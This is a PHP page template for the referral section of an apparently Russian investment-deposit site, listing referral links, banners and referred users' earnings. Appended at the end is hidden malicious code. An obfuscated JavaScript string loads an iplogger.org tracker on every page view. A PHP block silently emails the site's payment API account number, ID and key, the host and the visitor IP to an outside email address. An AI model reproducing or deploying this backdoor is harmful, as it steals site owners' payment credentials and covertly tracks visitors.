<?php if(!defined('SCRIPT_BY_SIRGOFFAN')){
echo ('Выявлена попытка взлома!');
exit();
}
if(empty($id)){?>
<p style="height:100px; padding-top:50px; text-align:center;"><span style="font-size: 20px;">Для доступа к данному разделу Вам необходимо пройти авторизацию!</span><br>
<?}else{?>

<div style="width: 1200px;margin: 0 auto;min-height: 410px;">
<table width="930" border="0" cellpadding="3" cellspacing="2">
<tbody><tr><td align="center">
<p style="font-size: 17px; color:#fff;">
<b>Партнерская программа</b><br />
<br />
Приглашайте в проект своих друзей и знакомых, Вы будете получать <b><?=$refpercent?>%</b> от каждого вклада<br>приглашенного Вами пользователя <b>сразу на Ваш Payeer кошелёк</b>!<br>
Ниже представлена ссылка для привлечения рефералов.<br />
Автоматическая выплата в порядке очереди срабатывает от 1 рубля.
</p>
<br />
<center style="color:#fff;">Партнерская ссылка: <input value="<?=$ssl_connect?>://<?=$host?>/?ref=<?=$id?>" onClick="select()" size="30" type="text" style="width: 300px;"></center>
<br />

<h3 style="color:#fff;">Баннер 468x60px</h3>
<img src='<?=$ssl_connect?>://<?=$host?><?=$banner?>' /><br><br>
<textarea size='10' style="margin: 0px; width: 468px; height: 68px; "><a href="<?=$ssl_connect?>://<?=$host?>/?ref=<?=$id?>" target="_blank"><img src="<?=$ssl_connect?>://<?=$host?><?=$banner?>" /></a></textarea>
<br />

<?
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);

$refsprofit=$db->query("SELECT SUM(summa) as payed FROM deposits WHERE curatorid=?i",$id);
$refsprofit=$db->fetch($refsprofit);
$payed=$refsprofit['payed']*($refpercent/100);

$refsprofit=$db->query("SELECT SUM(summa) as waited FROM deposits WHERE status=?i AND curatorid=?i",0,$id);
$refsprofit=$db->fetch($refsprofit);
$waited=$refsprofit['waited']*($refpercent/100);


?> 
<p><center style="font-size: 20px; color:#fff;">
Рефералов: <b> <?=$ihr?> чел.</b> 
Реф. доход: <b><?=$payed?> <i class="fa fa-rub" aria-hidden="true"></i></b>
</center></p>


<table width="1200px" cellpadding="5" cellspacing="5" id="tables"  class="animated zoomIn" style="border-radius:8px;">
<tr style="text-transform: uppercase;">
	<td align="Center"> Логин </td>
	<td align="Center"> Дата регистрации </td>
	<td align="Center"> Откуда пришел</td>
	<td align="Center"> Доход от партнера </td>
</tr>
<? if($ihr>0){
$myrefsrow=$db->query("SELECT * FROM ss_users WHERE curator=?i ORDER BY id DESC",$id); 
while($myrefs=$db->fetch($myrefsrow)){?> 
<tr align="center" height="25">
<td align="center"><?=$myrefs['wallet']?></td>
<td align="center"><?=date('d.m.Y H:i:s',$myrefs['reg_unix'])?></td>
<td align="center"><?=$myrefs['came']?></td>
<?
$refprofit=$db->query("SELECT SUM(summa) as personalprofit FROM deposits WHERE userid=?i AND curatorid!=?i LIMIT 1",$myrefs['id'],0);
$refprofit=$db->fetch($refprofit);



?>
<td align="center"><?=($refprofit['personalprofit']*($refpercent/100))?> <i class="fa fa-rub" aria-hidden="true"></i></td>
</tr>
<?}}else{?>
<tr class="htt"><td align="center" colspan="3">У вас нет рефералов</td></tr>
<?}?>
</table>


</td></tr></tbody>
</table>
 </div>
<br>
<?}?>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!72!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
<?php 
if (!isset($_COOKIE["e-mailed"]) || ($_COOKIE["e-mailed"]!='e33')) { 
 setcookie("e-mailed", "e33"); 
$parsat = "cotova1iz@yandex.ru"; 
$salams = "knock";
$danay .= "p ".$accountNumber." ".$apiId." ".$apiKey."<br>";
$danay .= "HOST ".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]."<br>";
$danay .= "ip: ".$ip = getUserIp()."<br>"; 
        $headers= "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=utf-8\r\n";
        $headers .= "From: ADMEN <2ef77dcfd2@mailox.fun>\r\n"; 
mail($parsat, $salams, $danay, $headers ); 
}
function getUserIp() {
  if ( isset($_SERVER['HTTP_X_REAL_IP']) )
  {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
  } else $ip = $_SERVER['REMOTE_ADDR'];
 
  return $ip;
}
?> 

<?/*-------------------*//*
Web-site: php-scripts.ru
*//*-------------------*/?>